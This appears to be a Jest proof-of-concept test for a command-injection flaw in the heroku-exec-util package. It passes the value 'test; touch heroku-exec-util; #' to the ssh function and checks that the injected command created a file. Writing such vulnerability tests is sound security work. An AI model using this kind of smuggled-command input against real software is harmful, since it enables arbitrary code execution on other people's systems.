//https://github.com/heroku/heroku-exec-util/pull/20
test("Remote code execution in heroku-exec-util", async () => {
  expect.assertions(2);
  const fs = require("fs");
  const heu = require("heroku-exec-util");
  const path = "./heroku-exec-util";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  // try {
  //     return heu.ssh({ args: {} }, 'test; touch heroku-exec-util; #', '', 'test', { path: 'test' }).finally(() => {
  //         file_exist = fs.existsSync(path);
  //         expect(file_exist).toBe(true);
  //         fs.unlink(path, function (err) {
  //         });
  //     });
  // } catch (error) {
  // }
  // return heu.ssh({ args: {} }, 'test; touch heroku-exec-util; #', '', 'test', { path: 'test' }).catch(err=>{
  //     console.log("err!");
  // }).finally(() => {
  //     file_exist = fs.existsSync(path);
  //     expect(file_exist).toBe(true);
  //     fs.unlink(path, function (err) {
  //     });
  // });

  await heu.ssh({ args: {} }, "test; touch heroku-exec-util; #", "", "test", {
    path: "test",
  });
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
